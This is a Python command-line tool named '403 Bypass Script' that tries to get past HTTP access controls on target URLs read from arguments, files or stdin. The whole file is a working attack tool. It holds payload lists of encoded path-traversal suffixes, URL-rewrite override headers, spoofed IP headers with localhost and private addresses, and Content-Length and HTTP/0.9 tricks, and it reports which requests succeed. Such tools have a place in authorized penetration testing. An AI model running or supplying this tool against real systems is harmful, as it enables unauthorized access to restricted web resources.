import requests
import argparse
from colorama import Fore, init
from urllib.parse import urlparse
import sys
import shutil  # For terminal width detection

init(autoreset=True)

PATH_PAYLOADS = [
    "/%2e/", "/..;/", "/%20", "/%09", "/%00",
    ".json", ".css", ".html", "?", "??", "???", "?testparam", "#", "#test",
    "/.", "//", "/././", "/..%2f", "/.%2e/", "/%2e%2e/", "/..%00/",
    "/%2e%2e%2f", "/..%c0%af", "/..%e0%80%af", "/..\\", "/...//", "/....//"
]

OVERRIDE_HEADERS = {
    "X-Original-URL": "{}",
    "X-Rewrite-URL": "{}"
}

IP_BYPASS_HEADERS = [
    "X-Custom-IP-Authorization", "X-Forwarded-For", "X-Forward-For", "X-Remote-IP",
    "X-Originating-IP", "X-Remote-Addr", "X-Client-IP", "X-Real-IP"
]

IP_VALUES = [
    "localhost", "localhost:80", "localhost:443", "127.0.0.1", "127.0.0.1:80",
    "127.0.0.1:443", "2130706433", "0x7F000001", "0177.0000.0000.0001", "0",
    "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", "172.16.0.1",
    "192.168.1.0", "192.168.1.1"
]

def color_status(code):
    if 200 <= code < 300:
        return Fore.GREEN + str(code)
    elif 400 <= code < 500:
        return Fore.RED + str(code)
    elif 500 <= code < 600:
        return Fore.YELLOW + str(code)
    else:
        return Fore.CYAN + str(code)

def send_request(method, url, headers=None, data=None, version=None):
    try:
        if version:
            import http.client as http_client
            parsed = urlparse(url)
            conn = http_client.HTTPConnection(parsed.netloc)
            path = parsed.path + ("?" + parsed.query if parsed.query else "")
            conn._http_vsn = 9
            conn._http_vsn_str = "HTTP/0.9"
            conn.request(method, path, headers=headers or {})
            res = conn.getresponse()
            return res.status
        else:
            r = requests.request(method, url, headers=headers, data=data, timeout=5)
            return r.status_code
    except Exception as e:
        return f"ERROR: {e}"

def print_cr(msg):
    """Print message with carriage return and line clearing"""
    cols, _ = shutil.get_terminal_size()
    if len(msg) > cols:
        msg = msg[:cols-4] + "..."
    sys.stdout.write(f"\r{msg}\x1b[K")  # \x1b[K clears line after cursor
    sys.stdout.flush()

def bypass(target, method="GET", custom_headers=None, custom_payloads=None, port=None, cr=False):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"}
    if custom_headers:
        for h in custom_headers:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.hostname}:{port if port else (parsed.port or (443 if parsed.scheme == 'https' else 80))}"
    path = parsed.path or "/"

    # Track if we found any successes for final newline
    found_success = False
    
    if cr:
        print_cr(f"{Fore.CYAN}[+] Testing: {target}")
    else:
        print(f"{Fore.CYAN}[+] Testing: {target}")

    # Test path payloads
    for p in custom_payloads or PATH_PAYLOADS:
        test_path = path.rstrip("/") + p
        full_url = base + test_path
        code = send_request(method, full_url, headers)
        
        if cr:
            if isinstance(code, int) and 200 <= code < 300:
                # FIX: Apply color only to status code, not entire message
                status_display = color_status(code)
                print_cr(f"{Fore.GREEN}✓ {full_url} => {status_display}")
                found_success = True
            else:
                print_cr(f"{Fore.CYAN}Testing paths: {test_path.ljust(30)}")
        elif isinstance(code, int):
            print(f"{Fore.CYAN}[Path:{test_path}] => {color_status(code)}")

    # Test header overrides
    for header, value_template in OVERRIDE_HEADERS.items():
        for case_variant in [header, header.lower(), header.capitalize()]:
            override = headers.copy()
            override[case_variant] = path
            code = send_request(method, base, override)
            
            if cr:
                if isinstance(code, int) and 200 <= code < 300:
                    status_display = color_status(code)
                    print_cr(f"{Fore.GREEN}✓ {base} [Header: {case_variant}] => {status_display}")
                    found_success = True
                else:
                    print_cr(f"{Fore.CYAN}Testing headers: {case_variant.ljust(20)}")
            elif isinstance(code, int):
                print(f"{Fore.CYAN}[Override:{case_variant}: {path}] => {color_status(code)}")

    # Test IP bypass headers
    for ip in IP_VALUES:
        for header_name in IP_BYPASS_HEADERS:
            spoofed = headers.copy()
            spoofed[header_name] = ip
            code = send_request(method, target, spoofed)
            
            if cr:
                if isinstance(code, int) and 200 <= code < 300:
                    status_display = color_status(code)
                    print_cr(f"{Fore.GREEN}✓ {target} [Header: {header_name}:{ip}] => {status_display}")
                    found_success = True
                else:
                    print_cr(f"{Fore.CYAN}Testing IP headers: {header_name.ljust(15)} {ip}")
            elif isinstance(code, int):
                print(f"{Fore.CYAN}[Header:{header_name}: {ip}] => {color_status(code)}")

    # Test Content-Length manipulation
    cl_headers = headers.copy()
    cl_headers['Content-Length'] = '1000'
    code = send_request("POST", target, headers=cl_headers, data="A"*1000)
    if cr:
        if isinstance(code, int) and 200 <= code < 300:
            status_display = color_status(code)
            print_cr(f"{Fore.GREEN}✓ {target} [CL Manipulation] => {status_display}")
            found_success = True
        else:
            print_cr(f"{Fore.CYAN}Testing CL manipulation")
    elif isinstance(code, int):
        print(f"{Fore.CYAN}[Content-Length manipulation] => {color_status(code)}")

    # Test HTTP/0.9
    code = send_request(method, target, headers=headers, version="0.9")
    if cr:
        if isinstance(code, int) and 200 <= code < 300:
            status_display = color_status(code)
            print_cr(f"{Fore.GREEN}✓ {target} [HTTP/0.9] => {status_display}")
            found_success = True
        else:
            print_cr(f"{Fore.CYAN}Testing HTTP/0.9")
    elif isinstance(code, int):
        print(f"{Fore.CYAN}[HTTP/0.9 Attempt] => {color_status(code)}")

    # Test path race condition
    race_path = path + path
    code = send_request(method, base + race_path, headers)
    if cr:
        if isinstance(code, int) and 200 <= code < 300:
            status_display = color_status(code)
            print_cr(f"{Fore.GREEN}✓ {base + race_path} => {status_display}")
            found_success = True
        else:
            print_cr(f"{Fore.CYAN}Testing race conditions")
    elif isinstance(code, int):
        print(f"{Fore.CYAN}[Path Race Condition:{race_path}] => {color_status(code)}")

    # Add final newline in CR mode
    if cr:
        if found_success:
            sys.stdout.write("\n")
        else:
            print_cr(f"{Fore.YELLOW}⨯ No bypasses found for {target}")
            sys.stdout.write("\n")
        sys.stdout.flush()

def main():
    parser = argparse.ArgumentParser(description="403 Bypass Script", add_help=True)
    parser.add_argument("-t", "--target", help="Target URL or file")
    parser.add_argument("-x", "--method", help="Custom HTTP Method (default: GET)", default="GET")
    parser.add_argument("-H", "--header", help="Custom Header(s) in format Header:Value", nargs='*')
    parser.add_argument("-p", "--payload", help="Custom Path Payload(s)", nargs='*')
    parser.add_argument("-port", type=int, help="Custom Port", default=None)
    parser.add_argument("-cr", action="store_true", help="Carriage return mode")
    args = parser.parse_args()

    # Add terminal width warning
    if args.cr:
        cols, _ = shutil.get_terminal_size()
        if cols < 60:
            print(f"{Fore.YELLOW}Warning: Terminal width {cols} may be too narrow for CR mode")

    targets = []
    if args.target:
        if args.target.startswith("http"):
            targets.append(args.target)
        else:
            with open(args.target) as f:
                targets.extend([line.strip() for line in f if line.strip()])
    else:
        if not sys.stdin.isatty():
            for line in sys.stdin:
                if line.strip():
                    targets.append(line.strip())

    for target in targets:
        bypass(target, 
               method=args.method, 
               custom_headers=args.header, 
               custom_payloads=args.payload, 
               port=args.port, 
               cr=args.cr)

if __name__ == "__main__":
    main()